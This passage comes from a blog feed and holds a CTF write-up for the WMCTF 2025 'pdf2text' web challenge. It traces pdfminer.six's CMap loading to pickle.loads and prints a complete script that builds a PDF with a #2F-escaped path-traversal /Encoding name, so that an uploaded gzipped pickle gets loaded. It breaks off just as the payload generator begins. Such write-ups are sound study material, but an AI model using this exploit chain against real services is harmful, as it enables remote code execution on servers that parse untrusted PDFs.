但调试就没问题, 也正常弹计算器, ???</p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="https://su-team.cn/posts/e3fd1be7.html#tellmewhy">https://su-team.cn/posts/e3fd1be7.html#tellmewhy</a></p><p> <a href="https://mp.weixin.qq.com/s/gl8lCAZq-8lMsMZ3_uWL2Q#%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E4%B8%89%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86">https://mp.weixin.qq.com/s/gl8lCAZq-8lMsMZ3_uWL2Q#%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E4%B8%89%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;L3CTF-2025-WEB-复现&quot;&gt;&lt;a href=&quot;#L3CTF-2025-WEB-复现&quot; class=&quot;headerlink&quot; title=&quot;L3CTF 2025 WEB 复现&quot;&gt;&lt;/a&gt;&lt;strong&gt;L3CTF 2025 WEB 复现&lt;/strong&gt;&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>WMCTF 2025 CTF WEB WP</title>
    <link href="http://example.com/2025/09/22/WMCTF-2025-CTF-WEB-WP/"/>
    <id>http://example.com/2025/09/22/WMCTF-2025-CTF-WEB-WP/</id>
    <published>2025-09-22T06:39:47.000Z</published>
    <updated>2025-09-25T16:31:39.267Z</updated>
    
    <content type="html"><![CDATA[<h2 id="pdf2text"><a href="#pdf2text" class="headerlink" title="pdf2text"></a>pdf2text</h2><p>题目代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, send_file, render_template</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfparser <span class="keyword">import</span> PDFParser</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfdocument <span class="keyword">import</span> PDFDocument</span><br><span class="line"><span class="keyword">import</span> os, io</span><br><span class="line"><span class="keyword">from</span> pdfutils <span class="keyword">import</span> pdf_to_text</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="string">&#x27;uploads&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>] = <span class="number">2</span> * <span class="number">1024</span> * <span class="number">1024</span>  <span class="comment"># 2MB limit</span></span><br><span class="line"></span><br><span class="line">os.makedirs(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;No file part&#x27;</span>, <span class="number">400</span></span><br><span class="line">    </span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    filename = file.filename</span><br><span class="line">    <span class="keyword">if</span> filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;No selected file&#x27;</span>, <span class="number">400</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">or</span> <span class="string">&#x27;/&#x27;</span> <span class="keyword">in</span> filename:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;directory traversal is not allowed&#x27;</span>, <span class="number">403</span> </span><br><span class="line"></span><br><span class="line">    pdf_path = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename)</span><br><span class="line">    pdf_content = file.stream.read()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># just if is a pdf</span></span><br><span class="line">        parser = PDFParser(io.BytesIO(pdf_content))</span><br><span class="line">        doc = PDFDocument(parser)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(e), <span class="number">500</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(pdf_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(pdf_content)</span><br><span class="line"></span><br><span class="line">    md_filename = os.path.splitext(filename)[<span class="number">0</span>] + <span class="string">&#x27;.txt&#x27;</span></span><br><span class="line">    txt_path = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], md_filename)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pdf_to_text(pdf_path, txt_path)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(e), <span class="number">500</span> </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> send_file(txt_path, as_attachment=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>自定义的pdf_to_text函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pdfminer.high_level <span class="keyword">import</span> extract_pages</span><br><span class="line"><span class="keyword">from</span> pdfminer.layout <span class="keyword">import</span> LTTextContainer</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pdf_to_text</span>(<span class="params">pdf_path, txt_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(txt_path, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> txt:</span><br><span class="line">        <span class="keyword">for</span> page_layout <span class="keyword">in</span> extract_pages(pdf_path):</span><br><span class="line">            <span class="keyword">for</span> element <span class="keyword">in</span> page_layout:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">isinstance</span>(element, LTTextContainer):</span><br><span class="line">                    txt.write(element.get_text())</span><br><span class="line">                    txt.write(<span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p>题目用pdfminer.six这个库实现了一个 提取上传pdf中文字并返回的功能<br>一开始的思路是看是否能在pdf中引入外部资源, 然后pdf转txt时解析外部资源, 这样来造成文件读取, 但是似乎没有</p><p>之后, 题目给了hint:</p><blockquote><p>Search “pickle.loads” in pdfminer package and try to reach it</p></blockquote><p>全局搜索, 能找到的也就这一处<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250922142700.png" alt="image.png"></p><p>那就很简单了, 就是打这里的pickle反序列化<br>很明显这里是gzip解压一个文件然后loads, 我们只需要想办法控制 <code>_load_data</code>的name参数<br>构造思路, 全局搜索 _load_data方法</p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250922143224.png" alt="image.png"><br>有两处触发点, 这里选用get_cmap, 继续往上找, 可以找到以下调用路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">extract_pages</span><br><span class="line">        PDFPageInterpreter#process_page</span><br><span class="line">                PDFPageInterpreter#render_contents</span><br><span class="line">                        PDFPageInterpreter#process_page</span><br><span class="line">                                PDFPageInterpreter#render_contents</span><br><span class="line">                                        PDFPageInterpreter#init_resources</span><br><span class="line">                                                PDFResourceManager#get_font</span><br><span class="line">                                                        PDFCIDFont#__init__</span><br><span class="line">                                                                PDFCIDFont#get_cmap_from_spec</span><br><span class="line">                                                                        CMapDB.get_cmap(cmap_name)</span><br><span class="line">                                                                            _load_data</span><br><span class="line">        </span><br></pre></td></tr></table></figure><p>extract_pages就是题目调用的地方</p><p>通过调试发现最后_load_data的参数是由&#x2F;Encoding控制的, 此外pdf中使用 # 来转义一个16进制数, 这样就可以使用 ..#2F构造出 ..&#x2F; , 避免与pdf中符号 &#x2F; 表示名字对象冲突</p><p>genPDF.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> annotations  </span><br><span class="line"><span class="keyword">import</span> os  </span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO  </span><br><span class="line"><span class="keyword">import</span> logging  </span><br><span class="line">  </span><br><span class="line">logging.basicConfig(level=logging.DEBUG)  </span><br><span class="line"><span class="comment"># This script hardcodes and generates a small PDF containing a variety of  </span></span><br><span class="line"><span class="comment"># page-content operators (graphics, text, state) so you can step through  </span></span><br><span class="line"><span class="comment"># pdfminer.six extract_pages() and observe how each operator is handled.  </span></span><br><span class="line"><span class="comment">#  </span></span><br><span class="line"><span class="comment"># Output: samples/debug_ops.pdf  </span></span><br><span class="line"><span class="comment">#  </span></span><br><span class="line"><span class="comment"># Key points to help debugging pdfminer internals:  </span></span><br><span class="line"><span class="comment"># - The font is a Type0 + CIDFont with /Encoding /GB-EUC-H to trigger  </span></span><br><span class="line"><span class="comment">#   CMapDB.get_cmap(&#x27;GB-EUC-H&#x27;) and thus CMapDB._load_data when not cached.  </span></span><br><span class="line"><span class="comment"># - The content stream includes operators: q/Q, cm, w, RG, rg, m, l, h, S,  </span></span><br><span class="line"><span class="comment">#   re, f, BT/ET, Tf, Td, Tm (implicit via Td), Tj, TJ.  </span></span><br><span class="line"><span class="comment"># - Chinese text bytes &lt;D6D0B9FA&gt; represent &quot;中国&quot; in GB2312, so with  </span></span><br><span class="line"><span class="comment">#   /Encoding /GB-EUC-H pdfminer will consult the CMap.  </span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_pdf_bytes</span>() -&gt; <span class="built_in">bytes</span>:  </span><br><span class="line">    bio = BytesIO()  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">w</span>(<span class="params">s: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">int</span>:  </span><br><span class="line">        pos = bio.tell()  </span><br><span class="line">        bio.write(s)  </span><br><span class="line">        <span class="keyword">return</span> pos  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># Collect objects then build xref.  </span></span><br><span class="line">    objects: <span class="built_in">list</span>[<span class="built_in">tuple</span>[<span class="built_in">int</span>, <span class="built_in">bytes</span>]] = []  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># 1. Catalog  </span></span><br><span class="line">    objects.append(  </span><br><span class="line">        (  </span><br><span class="line">            <span class="number">1</span>,  </span><br><span class="line">            <span class="string">b&quot;&lt;&lt; /Type /Catalog /Pages 2 0 R &gt;&gt;&quot;</span>,  </span><br><span class="line">        )  </span><br><span class="line">    )  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># 2. Pages  </span></span><br><span class="line">    objects.append(  </span><br><span class="line">        (  </span><br><span class="line">            <span class="number">2</span>,  </span><br><span class="line">            <span class="string">b&quot;&lt;&lt; /Type /Pages /Kids [3 0 R] /Count 1 &gt;&gt;&quot;</span>,  </span><br><span class="line">        )  </span><br><span class="line">    )  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># 4. Type0 Font with GB-EUC-H encoding to trigger CMap loading  </span></span><br><span class="line">    font_type0 = (  </span><br><span class="line">        <span class="number">4</span>,  </span><br><span class="line">        (  </span><br><span class="line">            <span class="string">b&quot;&lt;&lt; /Type /Font /Subtype /Type0 &quot;</span>  </span><br><span class="line">            <span class="string">b&quot;/BaseFont /DebugCID &quot;</span>            <span class="comment"># b&quot;/Encoding /..#2F..#2F..#2F..#2F..#2F..#2F..#2F..#2Ftmp#2Fn4c1&quot;  </span></span><br><span class="line">            <span class="string">b&quot;/Encoding /..#2F..#2F..#2F..#2F..#2F..#2F..#2F..#2F..#2F..#2F..#2Fapp#2Fuploads#2Fn4c1&quot;</span>  </span><br><span class="line">            <span class="string">b&quot;/DescendantFonts [6 0 R] &gt;&gt;&quot;</span>        ),  </span><br><span class="line">    )  </span><br><span class="line">    objects.append(font_type0)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># 6. CIDFont descendant with GB1 registry  </span></span><br><span class="line">    cidfont = (  </span><br><span class="line">        <span class="number">6</span>,  </span><br><span class="line">        (  </span><br><span class="line">            <span class="string">b&quot;&lt;&lt; /Type /Font /Subtype /CIDFontType0 &quot;</span>  </span><br><span class="line">            <span class="string">b&quot;/BaseFont /DebugCID &quot;</span>            <span class="string">b&quot;/CIDSystemInfo &lt;&lt; /Registry (n4c1222) /Ordering (n4c1_2) /Supplement 5 &gt;&gt; &quot;</span>            <span class="string">b&quot;/DW 1000 &quot;</span>            <span class="string">b&quot;/FontDescriptor &lt;&lt; &quot;</span>            <span class="string">b&quot;/Type /FontDescriptor &quot;</span>            <span class="string">b&quot;/FontName /DebugCID &quot;</span>            <span class="string">b&quot;/FontBBox [0 -200 1000 900] &quot;</span>  <span class="comment"># 必须是四个数字  </span></span><br><span class="line">            <span class="string">b&quot;/Ascent 800 &quot;</span>  </span><br><span class="line">            <span class="string">b&quot;/Descent -200 &quot;</span>            <span class="string">b&quot;/CapHeight 700 &quot;</span>            <span class="string">b&quot;/Flags 32 &quot;</span>            <span class="string">b&quot;/ItalicAngle 0 &quot;</span>            <span class="string">b&quot;/StemV 80 &quot;</span>            <span class="string">b&quot;&gt;&gt;&quot;</span>            <span class="string">b&quot;&gt;&gt;&quot;</span>        ),  </span><br><span class="line">    )  </span><br><span class="line">  </span><br><span class="line">    objects.append(cidfont)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># 5. Page content stream — includes a variety of operators  </span></span><br><span class="line">    <span class="comment"># Note: GB2312 for 中国 is D6 D0 B9 FA    content_ops = b&quot;\n&quot;.join(  </span></span><br><span class="line">        [  </span><br><span class="line">            <span class="string">b&quot;q&quot;</span>,  <span class="comment"># save graphics state  </span></span><br><span class="line">            <span class="string">b&quot;1 0 0 1 0 0 cm&quot;</span>,  <span class="comment"># identity CTM (explicit)  </span></span><br><span class="line">            <span class="string">b&quot;0.75 w&quot;</span>,  <span class="comment"># line width  </span></span><br><span class="line">            <span class="string">b&quot;0 0 1 RG&quot;</span>,  <span class="comment"># stroke color = blue  </span></span><br><span class="line">            <span class="string">b&quot;1 0 0 rg&quot;</span>,  <span class="comment"># fill color = red  </span></span><br><span class="line">            <span class="string">b&quot;100 600 m&quot;</span>,  <span class="comment"># move to  </span></span><br><span class="line">            <span class="string">b&quot;200 650 l&quot;</span>,  <span class="comment"># line to  </span></span><br><span class="line">            <span class="string">b&quot;300 600 l&quot;</span>,  <span class="comment"># line to  </span></span><br><span class="line">            <span class="string">b&quot;h&quot;</span>,  <span class="comment"># close path  </span></span><br><span class="line">            <span class="string">b&quot;S&quot;</span>,  <span class="comment"># stroke  </span></span><br><span class="line">            <span class="string">b&quot;100 500 150 40 re&quot;</span>,  <span class="comment"># rectangle  </span></span><br><span class="line">            <span class="string">b&quot;f&quot;</span>,  <span class="comment"># fill  </span></span><br><span class="line">            <span class="string">b&quot;BT&quot;</span>,  <span class="comment"># begin text  </span></span><br><span class="line">            <span class="string">b&quot;/F1 24 Tf&quot;</span>,  <span class="comment"># font + size  </span></span><br><span class="line">            <span class="string">b&quot;100 700 Td&quot;</span>,  <span class="comment"># move text position  </span></span><br><span class="line">            <span class="string">b&quot;&lt;48656C6C6F20504446&gt; Tj&quot;</span>,  <span class="comment"># &quot;Hello PDF&quot;  </span></span><br><span class="line">            <span class="string">b&quot;0 -30 Td&quot;</span>,  <span class="comment"># next line down  </span></span><br><span class="line">            <span class="string">b&quot;&lt;D6D0B9FA&gt; Tj&quot;</span>,  <span class="comment"># &quot;中国&quot; in GB2312; mapped via GB-EUC-H  </span></span><br><span class="line">            <span class="string">b&quot;-50 -40 Td&quot;</span>,  <span class="comment"># move  </span></span><br><span class="line">            <span class="string">b&quot;[(AB) -50 (&lt;20&gt;) 100 (CD)] TJ&quot;</span>,  <span class="comment"># kerning array example  </span></span><br><span class="line">            <span class="string">b&quot;ET&quot;</span>,  <span class="comment"># end text  </span></span><br><span class="line">            <span class="string">b&quot;Q&quot;</span>,  <span class="comment"># restore graphics state  </span></span><br><span class="line">            <span class="string">b&quot;&quot;</span>,  </span><br><span class="line">        ]  </span><br><span class="line">    )  </span><br><span class="line">    stream = <span class="string">b&quot;stream\n&quot;</span> + content_ops + <span class="string">b&quot;\nendstream&quot;</span>  </span><br><span class="line">    content_len = <span class="built_in">len</span>(stream) - <span class="built_in">len</span>(<span class="string">b&quot;stream\n&quot;</span>) - <span class="built_in">len</span>(<span class="string">b&quot;\nendstream&quot;</span>)  </span><br><span class="line">    content_obj = (  </span><br><span class="line">        <span class="number">5</span>,  </span><br><span class="line">        <span class="string">b&quot;&lt;&lt; /Length %d &gt;&gt;\n&quot;</span> % content_len + stream,  </span><br><span class="line">    )  </span><br><span class="line">    objects.append(content_obj)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># 3. Page (references content and font resource)  </span></span><br><span class="line">    page_dict = (  </span><br><span class="line">        <span class="number">3</span>,  </span><br><span class="line">        (  </span><br><span class="line">            <span class="string">b&quot;&lt;&lt; /Type /Page /Parent 2 0 R &quot;</span>  </span><br><span class="line">            <span class="string">b&quot;/MediaBox [0 0 612 792] &quot;</span>            <span class="string">b&quot;/Resources &lt;&lt; /Font &lt;&lt; /F1 4 0 R &gt;&gt; &gt;&gt; &quot;</span>            <span class="string">b&quot;/Contents 5 0 R &gt;&gt;&quot;</span>        ),  </span><br><span class="line">    )  </span><br><span class="line">    <span class="comment"># Ensure ordering: add page after fonts and content so refs exist  </span></span><br><span class="line">    objects.append(page_dict)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># Start writing file  </span></span><br><span class="line">    w(<span class="string">b&quot;%PDF-1.4\n%\xE2\xE3\xCF\xD3\n&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">    offsets: <span class="built_in">dict</span>[<span class="built_in">int</span>, <span class="built_in">int</span>] = &#123;&#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># Write each object, record offsets  </span></span><br><span class="line">    <span class="keyword">for</span> obj_id, obj_body <span class="keyword">in</span> objects:  </span><br><span class="line">        offsets[obj_id] = w(<span class="string">f&quot;<span class="subst">&#123;obj_id&#125;</span> 0 obj\n&quot;</span>.encode(<span class="string">&quot;ascii&quot;</span>))  </span><br><span class="line">        w(obj_body)  </span><br><span class="line">        w(<span class="string">b&quot;\nendobj\n&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># xref  </span></span><br><span class="line">    startxref = bio.tell()  </span><br><span class="line">    max_obj = <span class="built_in">max</span>(offsets) <span class="keyword">if</span> offsets <span class="keyword">else</span> <span class="number">0</span>  </span><br><span class="line">    <span class="comment"># xref table requires a free entry 0  </span></span><br><span class="line">    w(<span class="string">b&quot;xref\n&quot;</span>)  </span><br><span class="line">    w(<span class="string">f&quot;0 <span class="subst">&#123;max_obj + <span class="number">1</span>&#125;</span>\n&quot;</span>.encode(<span class="string">&quot;ascii&quot;</span>))  </span><br><span class="line">    <span class="comment"># object 0 free  </span></span><br><span class="line">    w(<span class="string">b&quot;0000000000 65535 f \n&quot;</span>)  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, max_obj + <span class="number">1</span>):  </span><br><span class="line">        off = offsets.get(i, <span class="number">0</span>)  </span><br><span class="line">        w(<span class="string">f&quot;<span class="subst">&#123;off:<span class="number">0</span>10d&#125;</span> 00000 n \n&quot;</span>.encode(<span class="string">&quot;ascii&quot;</span>))  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># trailer  </span></span><br><span class="line">    w(  </span><br><span class="line">        (  </span><br><span class="line">            <span class="string">b&quot;trailer\n&quot;</span>  </span><br><span class="line">            + <span class="string">b&quot;&lt;&lt; &quot;</span>  </span><br><span class="line">            + <span class="string">f&quot;/Size <span class="subst">&#123;max_obj + <span class="number">1</span>&#125;</span> &quot;</span>.encode(<span class="string">&quot;ascii&quot;</span>)  </span><br><span class="line">            + <span class="string">b&quot;/Root 1 0 R &quot;</span>  </span><br><span class="line">            + <span class="string">b&quot;&gt;&gt;\n&quot;</span>  </span><br><span class="line">        )  </span><br><span class="line">    )  </span><br><span class="line">    w(<span class="string">b&quot;startxref\n&quot;</span>)  </span><br><span class="line">    w(<span class="string">f&quot;<span class="subst">&#123;startxref&#125;</span>\n&quot;</span>.encode(<span class="string">&quot;ascii&quot;</span>))  </span><br><span class="line">    w(<span class="string">b&quot;%%EOF\n&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> bio.getvalue()  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>() -&gt; <span class="built_in">str</span>:  </span><br><span class="line">    out_dir = os.path.join(os.path.dirname(__file__), os.pardir, <span class="string">&quot;samples&quot;</span>)  </span><br><span class="line">    out_dir = os.path.abspath(out_dir)  </span><br><span class="line">    os.makedirs(out_dir, exist_ok=<span class="literal">True</span>)  </span><br><span class="line">    out_path = os.path.join(out_dir, <span class="string">&quot;debug_ops.pdf&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">    data = build_pdf_bytes()  </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(out_path, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">        f.write(data)  </span><br><span class="line">  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;PDF written:&quot;</span>, out_path)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Size:&quot;</span>, <span class="built_in">len</span>(data), <span class="string">&quot;bytes&quot;</span>)  </span><br><span class="line">    <span class="keyword">return</span> out_path  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:  </span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>这个脚本会生成一个pdf文件, 对他进行extract_pages时, 会触发<code>pickle.loads</code>, 去加载<code>/app/uploads/n4c1.pickle.gz</code></p><p>有了这个加载gzip压缩后opcode的pdf, 我们还需要上传一个gzip 的 opcode,<br>但是题目有对pdf的检测, 直接上传一个gzip是不行的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:  </span><br><span class="line">    <span class="comment"># just if is a pdf  </span></span><br><span class="line">    parser = PDFParser(io.BytesIO(pdf_content))  </span><br><span class="line">    doc = PDFDocument(parser)  </span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:  </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(e), <span class="number">500</span></span><br></pre></td></tr></table></figure><p>这一步直接拷打ai迭代出来<br>genOpcode.py:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 